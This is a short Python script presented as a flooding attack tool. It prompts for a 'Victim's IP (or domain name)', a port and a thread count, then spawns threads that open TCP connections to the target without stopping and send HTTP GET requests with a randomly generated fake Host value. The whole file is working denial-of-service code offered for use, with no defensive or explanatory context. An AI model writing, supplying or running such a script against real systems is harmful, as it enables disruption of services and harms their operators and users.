import socket
import random
import threading

packet_num = 0


def get_proxy():
            fake = ""
            # Random IP generator
            for i in range(4):
                fake += str(random.randint(0, 255))
                fake += "." if i != 3 else ""
            return fake

def start_attack():
    global packet_num
    while True:
        try:
            proxy = get_proxy()
        
            # Create socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
        
            # Send packets to target
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + proxy + "\r\n\r\n").encode('ascii'), (target, port))
        
            # Closing connection
            s.close()
            packet_num += 1
            print(f"\n[{packet_num}] >> Sent packet to the {target}", end="")
        except:
            print("[answer] >> An error occured!")
            break

try:
    target = input("Victim's IP (or domain name) >> ")
    port = int(input("Port >> "))
    threads_amount = int(input("Amount of threads >> "))
    for i in range(threads_amount):
        trd = threading.Thread(target=start_attack)
        trd.start()
except:
    print("[answer] >> An error occured!")
